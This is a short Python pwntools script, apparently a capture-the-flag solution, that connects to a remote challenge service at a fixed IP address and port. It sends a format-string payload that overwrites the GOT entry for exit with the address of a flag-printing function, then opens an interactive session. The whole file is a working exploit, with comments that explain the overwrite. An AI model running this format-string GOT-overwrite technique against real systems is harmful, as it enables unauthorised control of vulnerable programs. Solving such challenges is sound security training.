from pwnlib import *
from pwn import *

r = remote('140.113.207.240', 8835)
#r = process('./GOT')
context.clear(arch = 'amd64')
exploit = fmtstr_payload(6, {0x404038: 0x4011b6}, write_size='byte', numbwritten=0)
                       # offet, {old: new} (old address value replaced by new value)
                       # 0x404038: exit(1) system call's GOT; 0x4011b6: flag_func
r.recvuntil('Give me some goodies: ')
r.sendline(exploit)
r.interactive()

